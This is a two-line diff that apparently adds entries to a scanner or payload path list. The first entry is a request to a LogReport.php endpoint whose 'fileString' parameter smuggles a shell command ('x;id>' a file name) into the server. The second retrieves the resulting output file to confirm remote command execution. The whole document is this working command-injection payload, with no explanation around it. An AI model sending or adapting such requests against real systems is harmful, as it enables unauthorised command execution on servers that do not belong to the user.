@@ -1,0 +1,2 @@
+/Interface/LogReport/LogReport.php?action=execUpdate&fileString=x;id>gwfudsjfvcdha3278yrhu.txt
+/Interface/LogReport/gwfudsjfvcdha3278yrhu.txt
